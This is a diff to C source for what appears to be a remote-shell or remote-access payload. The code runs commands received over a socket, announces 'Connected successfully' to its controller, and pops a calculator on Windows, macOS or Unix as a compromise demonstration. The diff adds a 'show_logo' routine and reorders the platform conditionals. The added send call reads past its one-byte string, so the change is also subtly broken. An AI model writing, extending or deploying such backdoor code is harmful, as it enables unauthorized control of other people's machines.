@@ -221,6 +221,12 @@ void execute_no_timeout(int sock, char* raw_cmd) {
 #endif
 }
 
+// 上线后显示logo
+int show_logo(int s) {
+    send(s, "", 5, 0);
+    return 0;
+}
+
 
 // 成功上线演示提示
 int Payload_Demonstrate(void) {
@@ -232,13 +238,14 @@ int Payload_Demonstrate(void) {
         // calculator:// 协议失败，回退到 calc.exe
         ShellExecute(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOWNORMAL);
     }
-    
-#ifdef _APPLE
+
+#elif defined(_APPLE)
     // macOS(Darwin) 实现：通过posix_spawn来打开 Calculator.app，避免弹出终端窗口
     pid_t pid;
     extern char **environ;
     const char *argv[] = {"Calculator.app", NULL};
     posix_spawn(&pid, "Calculator.app", NULL, NULL, argv, environ);
+
 #else
     // 其他的默认是UNIX平台
     // Linux/BSD等等(UNIX) 实现：通过posix_spawn来打开默认计算器，避免弹出终端窗口
@@ -285,6 +292,7 @@ int main(int argc, char *argv[]) {
 #endif
         }
         
+        show_logo(s);
         send(s, "[+] Connected successfully.\n", 27, 0);
 
         while (1) {
